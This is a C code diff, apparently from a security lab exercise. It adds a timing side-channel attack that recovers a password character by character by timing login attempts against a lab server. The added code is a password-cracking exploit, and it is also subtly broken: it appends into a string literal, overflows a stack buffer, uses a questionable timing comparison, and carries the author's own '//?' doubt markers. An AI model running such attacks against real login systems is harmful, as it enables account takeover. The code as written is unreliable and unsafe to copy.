@@ -21,6 +21,11 @@
 char* ip = shan_lab_ip;
 
 #define NUM_ITERS 50
+#define NUM_CHARS 27
+char CHARS[NUM_CHARS] = {'a','b','c','d','e','f','g','h','i',
+                         'j','k','l','m','n','o','p','q','r',
+                         's','t','u','v','w','x','y','z','_'};
+#define TIME_DIFFERENCE 100
 
 struct timespec req_before, req_after;
 const int max_expected_args = 2;
@@ -64,6 +69,37 @@ double test_creds(char* user, char* pass, int username_size, int password_size, 
   }
 
   return ret;
+}
+
+char* perform_attack(int socket, char* username) {
+  char* guess = ""; //empty string not checked
+  int test;
+  int exec_time = 0;
+
+  while(1) {
+    char current_guess[strlen(guess) + 1]; //?
+    strcpy(current_guess, guess);
+
+    for (int i = 0; i < NUM_CHARS; i++) {
+      strncat(current_guess, &CHARS[i], 1);
+      test = test_creds(username, current_guess, strlen(username), strlen(current_guess), socket);
+      if (test == -1) exit(EXIT_FAILURE);
+      else if (test == -2) {
+        strncat(guess, &CHARS[i], 1);
+        return guess;
+      }
+      else if (exec_time - test > TIME_DIFFERENCE) { //?
+        exec_time = test;
+        guess = current_guess;
+        break;
+      }
+    }
+
+    perror("password not recovered");
+    exit(EXIT_FAILURE); //?
+  }
+  
+  return 0;
 }
 
 int main(int argc, char const *argv[]) {
